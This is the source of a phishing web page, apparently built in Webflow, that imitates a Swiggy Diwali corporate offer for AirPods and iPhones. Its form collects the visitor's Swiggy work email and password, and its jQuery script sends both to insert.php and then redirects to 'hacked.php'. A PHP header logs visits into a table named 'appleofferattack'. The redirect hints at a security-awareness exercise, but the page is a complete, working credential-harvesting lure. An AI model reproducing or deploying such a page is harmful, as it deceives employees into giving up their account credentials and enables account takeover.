<?php
session_start();

if (isset($_SESSION['views']))
    $_SESSION['views'] = $_SESSION['views'] + 1;
else
    $_SESSION['views'] = 1;

$count = $_SESSION['views'];

require 'conn.php';

$sql = "insert into appleofferattack (count)
        values('$count'); ";
$result = mysqli_query($mysqli, $sql);


session_destroy();

?>
<!DOCTYPE html><!--  This site was created in Webflow. http://www.webflow.com  -->
<!--  Last Published: Wed Oct 20 2021 13:38:56 GMT+0000 (Coordinated Universal Time)  -->
<html data-wf-page="616675e0196ee9b0544021b1" data-wf-site="616675e0196ee96bfc4021b0">
<head>
  <meta charset="utf-8">
  <title>SwiggyRansomeware</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/swiggyransomeware.webflow.css" rel="stylesheet" type="text/css">
  <!-- [if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" type="text/javascript"></script><![endif] -->
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="images/swiggy-1.svg" rel="shortcut icon" type="image/x-icon">
  <link href="images/swiggy-1.svg" rel="apple-touch-icon">
</head>
<body class="body">
  <div class="container w-container"></div>
  <div class="container-3 w-container">
    <!-- <img src="images/swiggy-logo-1.svg" loading="lazy" width="156" alt=""> -->
  </div>
  <div class="w-container">
    <h1 class="heading-2">Festive Together. Corporate Offer. Shop Now !</h1>
  </div>
  <div class="container-5 w-container">
    <div class="div-block-2">
      <h3 class="heading-3">Celeberate Diwali with Airpods and Iphone on us. Flat 45% off.</h3><img src="images/1.png" loading="lazy" width="381" sizes="(max-width: 767px) 70vw, 381px" srcset="images/1.png 500w, images/1.png 800w, images/1.png 1080w, images/1.png 1600w, images/1.png 2000w, images/1.png 2432w" alt="">
      <h3 class="heading-4">From ₹ 5402 / mon or ₹ 45900 with trade-in.</h3>
    </div>
    <div class="div-block">
      <div class="w-form">
        <form id="email-form" name="email-form" data-name="Email Form"><label for="name" class="field-label">Email </label><input type="text" class="text-field-2 w-input" maxlength="256" name="name" data-name="Name" placeholder="Enter Your Swiggy Mail ID" id="emailid"><label for="email" class="field-label-2">Password</label><input type="password" id="phno" class="text-field w-input" maxlength="256" name="email" data-name="Email" placeholder="Enter Your Password" id="email" required=""><input type="submit" value="Login" data-wait="Please wait..." class="submit-button w-button" id="submit"></form>
        <div class="w-form-done">
          <div>Thank you! Your submission has been received!</div>
        </div>
        <div class="w-form-fail">
          <div>Oops! Something went wrong while submitting the form.</div>
        </div>
      </div>
    </div>
  </div>
  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=616675e0196ee96bfc4021b0" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>
  <script>
    $(document).ready(function () {


      $('#submit').click(function () {
        var emailid = $('#emailid').val();
        var phno = $('#phno').val();

        if ($('#emailid').val().length === 0 ||
          $('#phno').val().length === 0) {
          alert('Enter all the fields');
        } else if (!emailid.includes("@swiggy.in")){
          alert('Enter your Swiggy Mail ID'); 
        }
        else {
          $.get('insert.php', {
            'emailid': emailid,
            'phno': phno

          }, function () {

            console.log('worked');
          }, "json");

          $('#emailid').val("");
          $('#phno').val("");
          console.log('working')
          var url = 'hacked.php';
          $(location).prop('href', url);

        }
      })
    });
  </script>
  <!-- [if lte IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif] -->
</body>
</html>